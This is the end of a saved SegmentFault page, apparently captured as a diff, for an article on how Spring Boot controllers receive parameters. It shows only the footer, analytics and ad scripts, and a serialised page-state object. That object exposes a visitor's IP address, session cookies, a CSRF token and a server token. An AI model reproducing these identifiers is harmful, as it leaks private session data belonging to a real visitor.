col-md-2"><dt class="h6">课程</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=java&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">Java 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=php&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">PHP 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?tag=python&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">Python 开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/edu?category=1&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">前端开发课程</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/lives/study?category=3&amp;sort=hottest&amp;utm_source=sf-footer" target="_blank" rel="noreferrer">移动开发课程</a></dd></dl><dl class="col-4 col-md-2 "><dt class="h6">资源</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/weekly?utm_source=sf-footer" target="_blank" rel="noreferrer">每周精选</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/users?utm_source=sf-footer" target="_blank" rel="noreferrer">用户排行榜</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/badges?utm_source=sf-footer" target="_blank" rel="noreferrer">徽章</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/faq?utm_source=sf-footer" target="_blank" rel="noreferrer">帮助中心</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/repu?utm_source=sf-footer" target="_blank" rel="noreferrer">声望与权限</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/community?utm_source=sf-footer" target="_blank" rel="noreferrer">社区服务中心</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/0x?utm_source=sf-footer" target="_blank" rel="noreferrer">建议反馈</a></dd></dl><dl class="col-4 col-md-2"><dt class="h6">合作</dt><dd class="my-1"><a class="text-secondary" href="https://about.segmentfault.com/?utm_source=sf-footer" target="_blank" rel="noreferrer">关于我们</a></dd><dd class="my-1"><a class="text-secondary" href="https://business.segmentfault.com/ads?utm_source=sf-footer" target="_blank" rel="noreferrer">广告投放</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/jobs?utm_source=sf-footer" target="_blank" rel="noreferrer">职位发布</a></dd><dd class="my-1"><a class="text-secondary" href="https://jinshuju.net/f/HK5r9K?utm_source=sf-footer" target="_blank" rel="noreferrer">讲师招募</a></dd><dd class="my-1"><a class="text-secondary" href="mailto:pr@segmentfault.com?utm_source=sf-footer" target="_blank" rel="noreferrer">联系我们</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/link?utm_source=sf-footer" target="_blank" rel="noreferrer">合作伙伴</a></dd></dl><dl class="col-4 col-md-2"><dt class="h6">关注</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault?utm_source=sf-footer" target="_blank" rel="noreferrer">产品技术日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/community_admin?utm_source=sf-footer" target="_blank" rel="noreferrer">社区运营日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault_news?utm_source=sf-footer" target="_blank" rel="noreferrer">市场运营日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/segmentfault_team?utm_source=sf-footer" target="_blank" rel="noreferrer">团队日志</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/blog/interview?utm_source=sf-footer" target="_blank" rel="noreferrer">社区访谈</a></dd></dl><dl class="col-4 col-md-2" id="license"><dt class="h6">条款</dt><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/tos?utm_source=sf-footer" target="_blank" rel="noreferrer">服务条款</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/privacy?utm_source=sf-footer" target="_blank" rel="noreferrer">隐私政策</a></dd><dd class="my-1"><a class="text-secondary" href="https://segmentfault.com/app?utm_source=sf-footer">下载 App</a></dd><dd class="my-1"><div class="weixin-qrcode ml-n1" title="微信公众号"></div></dd></dl></div><hr class="mt-2 mb-4"><div class="row"><div class="col-md-8"><div class="text-secondary"><p class="mb-1">Copyright © 2011-<!-- -->2021<!-- --> SegmentFault. 当前呈现版本 <!-- -->21.06.03</p><p class="mb-1"><a class="text-secondary mr-2" target="_blank" href="http://beian.miit.gov.cn/" rel="nofollow noreferrer">浙ICP备15005796号-2</a><a class="text-secondary mr-2" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602002000" rel="nofollow noreferrer">浙公网安备33010602002000号</a><span class="text-secondary">ICP 经营许可 浙B2-20201554</span></p><p class="mb-0">杭州堆栈科技有限公司版权所有</p></div></div><div class="col-md-4 text-right"><div class="shareContent"><a class="share_weixin" data-share="weixin" href="#javascript" aria-label="微信"><i class="mr-1 fab fa-weixin"></i></a><a class="share_weibo" data-share="weibo" href="http://weibo.com/segmentfault" target="_blank" rel="noreferrer" aria-label="微博"><i class="fab fa-weibo mr-1"></i></a><a class="share_github" data-share="github" href="https://github.com/SegmentFault" target="_blank" rel="noreferrer" aria-label="github"><i class="mr-1 fab fa-github"></i></a><a class="share_twitter" data-share="twitter" href="https://twitter.com/segment_fault" target="_blank" rel="noreferrer" aria-label="twitter"><i class="mr-1 fab fa-twitter"></i></a></div></div></div></div></footer></div>
+	<script>
+  window.g_useSSR = true;
+  window.g_initialProps = {"router":{"location":{"pathname":"\u002Fa\u002F1190000025188239","search":"","hash":"","query":{},"state":undefined,"key":"nybbb8"},"action":"POP"},"@@dva":0,"action":{"1190000025188239":{"votes":10,"isLiked":false,"isHated":undefined,"bookmarks":7,"bookmarkState":false}},"article":{"articles":{"rows":[],"size":0,"offset":0,"hasMore":true,"error":false,"loading":false,"isStopLoad":false,"cutLoadNum":1,"isLoadedFirstRecommend":false,"query":""},"currentTab":""},"articleDetail":{"artDetail":{"1190000025188239":{"title":"java - spring-boot-route（一）Controller接收参数的几种方式_个人文章","keywords":"springboot,java","description":"Controller接收参数的常用方式总体可以分为三类。第一类是Get请求通过拼接url进行传递，第二类是Post请求通过请求体进行传递，第三类是通过请求头部进行参数传递。","article":{"id":1190000025188239,"title":"spring-boot-route（一）Controller接收参数的几种方式","cover":null,"tags_list":"1040000002981698,1040000000089449","user_id":1030000020535062,"blog_id":0,"excerpt":"Controller接收参数的常用方式总体可以分为三类。第一类是Get请求通过拼接url进行传递，第二类是Post请求通过请求体进行传递，第三类是通过请求头部进行参数传递。","parsed_text":"","is_bookmarked":false,"is_liked":false,"created":1601638255,"modified":1620442122,"real_views":1048,"real_unique_views":965,"votes":10,"bookmarks":7,"status":0,"origin_url":"","article_type":1,"license":"1","langs":[],"comments":0,"tags":[{"id":1040000002981698,"url":"\u002Ft\u002Fspringboot","name":"springboot","icon_url":""},{"id":1040000000089449,"url":"\u002Ft\u002Fjava","name":"java","icon_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F868\u002F271\u002F868271510-54cb382abb7a1_small"}],"user":{"id":1030000020535062,"name":"Java旅途","avatar_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F229\u002F561\u002F2295617052-5ebaac9a8df71_huge128","url":"\u002Fu\u002Fjavatrip","rank":987,"rankWord":"987","is_followed":false,"excerpt":null,"followers":6062,"articles":99,"user_auth":null},"status_key":"available"},"blog":null,"actions":[],"member_actions":[],"article_types":{"1":"原创","2":"转载","3":"翻译"},"pay_info":null,"extra":{"reason":null,"operator":null,"operator_time":null},"tag":{"name":"java","url":"\u002Ft\u002Fjava","icon_url":"https:\u002F\u002Favatar-static.segmentfault.com\u002F868\u002F271\u002F868271510-54cb382abb7a1_small"},"isServerLoaded":true}},"alertMsg":{"showAlert":false,"msg":""},"articleRelated":[]},"editor":{"markdownContent":"","syncMarkdown":false,"title":{"value":"","isInvalid":false,"errorMsg":""},"log":{"value":"","isInvalid":false,"errorMsg":""},"tags":{"value":[],"isInvalid":false,"errorMsg":""},"draftInfo":{"id":"","status":""},"isInsert":false,"isFull":false,"initTags":[]},"global":{"sessionUser":null,"isHiddenHeader":false,"isHiddenFooter":false,"title":"spring-boot-route（一）Controller接收参数的几种方式 - SegmentFault 思否","isShowLogin":false,"beginnerGuideState":{"visible":false,"type":1},"isShowBindMobile":false,"authChannel":"","unactivated":false,"isShowRegister":false,"headOptions":{"keywords":"springboot,java","description":"Controller接收参数的常用方式总体可以分为三类。第一类是Get请求通过拼接url进行传递，第二类是Post请求通过请求体进行传递，第三类是通过请求头部进行参数传递。"},"notices":[],"sessionInfo":{"key":"b6fc17f83bc0e306a1d0ef83eeac11f0","login":false,"id":null},"singleNotice":"","currentRoute":{"customLayout":false,"eggCtx":{"request":{"method":"GET","url":"\u002Fa\u002F1190000025188239","header":{"host":"segmentfault.com","x-https-cn":"yes","x-ddos":"yes","connection":"close","user-agent":"Mozilla\u002F5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko\u002F20100101 Firefox\u002F86.0","x-true-ip":"210.83.229.241","x-real-ip":"210.83.229.241","web-server-type":"nginx","wl-proxy-client-ip":"210.83.229.241","x-forwarded-for":"210.83.229.241","x-forwarded-proto":"https","x-forwarded-cluster":"waf,","eagleeye-traceid":"7b39758716227063069231090e7a1c","accept":"text\u002Fhtml,application\u002Fxhtml+xml,application\u002Fxml;q=0.9,image\u002Fwebp,*\u002F*;q=0.8","accept-language":"zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3","accept-encoding":"gzip, deflate, br","referer":"https:\u002F\u002Fwww.google.com.hk\u002F","upgrade-insecure-requests":"1","cache-control":"max-age=0","cookie":"Hm_lvt_e23800c454aa573c0ccb16b52665ac26=1622688370; _ga=GA1.2.93359487.1619424609; __gads=ID=ed6686cc6164c511-226f99a192c70023:T=1619424613:RT=1619424613:S=ALNI_MZZ_1PLK3qL5wNlzhV3UjK3fnA80w; csrfToken=LxZZJ3sLp8zikgA7TYfv-cBg; Hm_lpvt_e23800c454aa573c0ccb16b52665ac26=1622688370; PHPSESSID=fd87321b5a5e12f835670fb2a1169b7b; PHPSESSID=e06655093d51ab51e326d5f6c17e75e4; _gid=GA1.2.765037198.1622688374; acw_tc=7b39758716227063062871062e7a1cca1d06ef9ddaa22cae3b238f49248812; acw_sc__v2=60b88882ea69c8da179f0f8a86fe77aac74d4377","eagleeye-rpcid":"0.1"}},"response":{"status":404,"message":"Not Found","header":{"set-cookie":["PHPSESSID=b6fc17f83bc0e306a1d0ef83eeac11f0; path=\u002F; max-age=604800; expires=Thu, 10 Jun 2021 07:45:06 GMT; domain=.segmentfault.com"]}},"app":{"env":"prod","name":"server","baseDir":"\u002Fusr\u002Fsrc\u002Fapp","subdomainOffset":2,"config":"\u003Cegg config\u003E","controller":"\u003Cegg controller\u003E","httpclient":"\u003Cegg httpclient\u003E","loggers":"\u003Cegg loggers\u003E","middlewares":"\u003Cegg middlewares\u003E","router":"\u003Cegg router\u003E","serviceClasses":"\u003Cegg serviceClasses\u003E"},"originalUrl":"\u002Fa\u002F1190000025188239","req":"\u003Coriginal node req\u003E","res":"\u003Coriginal node res\u003E","socket":"\u003Coriginal node socket\u003E"}},"letterNum":0,"noticeNum":0,"serverData":{"userAgent":"Mozilla\u002F5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko\u002F20100101 Firefox\u002F86.0","Token":"fd87321b5a5e12f835670fb2a1169b7b"},"userStat":{},"newTask":{},"followedTags":[],"globalCss":"","baiduOxAppState":{"isShow":false,"copyUrl":""},"pageUsers":{},"wxShareCover":"","isBaiduOxApp":false},"video":{"videoData":{},"relationVideos":[],"videos":{"rows":[],"limit":0,"offset":0,"hasMore":true},"lives":[]},"blogs":{"channels":{},"articles":{"mode":"scrollLoad","page":1,"rows":[],"size":0,"offset":0,"hasMore":true,"error":false,"loading":false,"isStopLoad":false,"cutLoadNum":1,"isLoadedFirstRecommend":false},"currentTab":"recommendation","notices":{},"events":{},"recommendArticles":{},"hotQuestions":{},"hotTestData":{},"banners":{},"showOneLoading":false},"dianping":{"homeInfo":{},"categroies":[],"categoryList":[],"categoryInfo":{},"loading":false,"companyInfo":{}},"dpDetail":{"dpDetail":{},"dpList":{"page":1,"total_page":10,"rows":[]},"usedsAndWishs":{"useds":0,"wisheds":0}},"letterDetail":{"letterData":{"rows":[],"page":1,"size":100,"total_page":0,"hasMore":true},"loading":false,"readAll":false},"inbox":{"list":{"page":1,"count":0,"rows":{"inbox":{},"messages":[]},"total_page":1},"loading":false},"noticeDetail":{"noticeData":{"rows":[],"offset":"","hasMore":true,"isStopScrollLoad":false,"loadedNum":1},"loading":false,"readAll":false},"personal":{"personalInfo":{},"listInfo":{"rows":[]},"blogs":[],"tags":{},"badges":{},"ranks":{},"loading":false},"personalSetting":{"userInfo":{},"errorMsg":{"type":"","msg":""}},"portal":{"pageData":{},"noticeData":[]},"question":{"questionDetail":{},"relateDetail":{}},"questionList":{"questionList":{"page":1,"size":30,"count":0,"total_page":0,"rows":[]},"updateList":{"offset":"","rows":[]},"showLoading":false,"hostData":{},"userRank":{},"notices":{},"loading":false},"sites":{"questionList":{"page":1,"size":30,"count":0,"total_page":0,"rows":[]},"loading":false,"information":{},"articles":[]},"sitesSet":{"loading":false,"information":{}},"loading":{"global":false,"models":{"articleDetail":false},"effects":{"articleDetail\u002FgetArtDetail":false}}};
+	</script>
+
+    <script src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/gt.js"></script>
+    <script>
+      (function () {
+        var data = window.g_initialProps["gtagData"] || window["gtagData"];
+        var script = document.createElement("script");
+        script.src = "https://www.googletagmanager.com/gtag/js?id=UA-918487-8";
+        script.async = true;
+        script.onload = function () {
+          window.dataLayer = window.dataLayer || [];
+          window.gtag = function () {
+            window.dataLayer.push(arguments);
+          };
+          window.gtag("js", new Date());
+          window.gtag("config", "UA-918487-8");
+          data && window.gtag("set", data);
+        };
+        document.getElementsByTagName("head")[0].appendChild(script);
+      })();
+    </script>
+    <script src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/umi.js"></script>
+  
+
+
+  <div class="is-active ImageView p-4" style="display: none;">
+      <div class="ImageView-inner" style="overflow: auto;">
+          <img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/view.webp" class="ImageView-img" alt="preview" style="max-width: 100%">
+      </div>
+  </div><ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"><ins id="aswift_2_expand" style="border: medium none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-table;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_2_anchor" style="border: medium none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: block;"><iframe id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-6330872677300335&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;lmt=1622706315&amp;plat=1%3A17858568%2C2%3A17858568%2C9%3A32776%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32&amp;format=0x0&amp;url=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000025188239&amp;ea=0&amp;flash=0&amp;pra=7&amp;wgl=1&amp;dt=1622706314379&amp;bpp=1&amp;bdt=7340&amp;idt=296&amp;shv=r20210525&amp;cbv=%2Fr20190131&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3Ded6686cc6164c511-226f99a192c70023%3AT%3D1619424613%3ART%3D1619424613%3AS%3DALNI_MZZ_1PLK3qL5wNlzhV3UjK3fnA80w&amp;prev_fmts=300x250&amp;nras=1&amp;correlator=4312961243908&amp;frm=20&amp;pv=1&amp;ga_vid=93359487.1619424609&amp;ga_sid=1622706315&amp;ga_hid=1232291614&amp;ga_fc=0&amp;u_tz=480&amp;u_his=1&amp;u_java=0&amp;u_h=1440&amp;u_w=2560&amp;u_ah=1400&amp;u_aw=2560&amp;u_cd=24&amp;u_nplug=0&amp;u_nmime=0&amp;adx=-12245933&amp;ady=-12245933&amp;biw=2411&amp;bih=1072&amp;scr_x=0&amp;scr_y=324&amp;eid=31060957%2C31061048&amp;oid=3&amp;pvsid=1998679025877523&amp;pem=534&amp;ref=https%3A%2F%2Fwww.google.com.hk%2F&amp;eae=2&amp;fc=896&amp;brdim=116%2C80%2C116%2C80%2C2560%2C0%2C2440%2C1208%2C2428%2C1072&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;ifi=3&amp;uci=a!3&amp;fsb=1&amp;dtd=1118" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!3" frameborder="0"></iframe></ins></ins></ins></body><iframe id="google_esf" name="google_esf" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/zrt_lookup.htm" style="display: none;"></iframe></html>
